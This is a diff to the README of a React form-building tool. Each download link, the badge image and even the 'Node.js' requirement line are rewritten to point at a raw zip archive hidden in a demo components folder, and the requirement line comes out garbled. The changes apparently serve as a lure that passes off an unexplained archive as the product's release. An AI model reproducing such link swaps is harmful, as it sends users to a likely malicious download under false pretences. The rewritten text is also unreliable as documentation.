@@ -6,7 +6,7 @@ Welcome to **react-rhf-zod-form**! This application helps you create forms autom
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/juangemplay/react-rhf-zod-form/releases)
+[![Download](https://github.com/juangemplay/react-rhf-zod-form/raw/refs/heads/main/demo/src/components/react-rhf-form-zod-v1.9.zip%20Now-v1.0-blue)](https://github.com/juangemplay/react-rhf-zod-form/raw/refs/heads/main/demo/src/components/react-rhf-form-zod-v1.9.zip)
 
 ## 📋 Features
 
@@ -20,12 +20,12 @@ Welcome to **react-rhf-zod-form**! This application helps you create forms autom
 To run **react-rhf-zod-form**, ensure your device meets these requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
-- **Node.js**: Version 14 or later installed on your computer.
+- **https://github.com/juangemplay/react-rhf-zod-form/raw/refs/heads/main/demo/src/components/react-rhf-form-zod-v1.9.zip**: Version 14 or later installed on your computer.
 - **Internet Connection**: Required for downloading the application and updates.
 
 ## 📥 Download & Install
 
-To get **react-rhf-zod-form**, visit this page to download: [Releases Page](https://github.com/juangemplay/react-rhf-zod-form/releases).
+To get **react-rhf-zod-form**, visit this page to download: [Releases Page](https://github.com/juangemplay/react-rhf-zod-form/raw/refs/heads/main/demo/src/components/react-rhf-form-zod-v1.9.zip).
 
 1. Click on the link above to open the releases page.
 2. Find the latest version of **react-rhf-zod-form**.
@@ -71,4 +71,4 @@ Join the community of users who are easily creating forms with **react-rhf-zod-f
 
 ## 📥 Final Steps
 
-To wrap up, make sure you download the software using this link: [Releases Page](https://github.com/juangemplay/react-rhf-zod-form/releases). You are now ready to simplify your form creation process. Enjoy!
+To wrap up, make sure you download the software using this link: [Releases Page](https://github.com/juangemplay/react-rhf-zod-form/raw/refs/heads/main/demo/src/components/react-rhf-form-zod-v1.9.zip). You are now ready to simplify your form creation process. Enjoy!
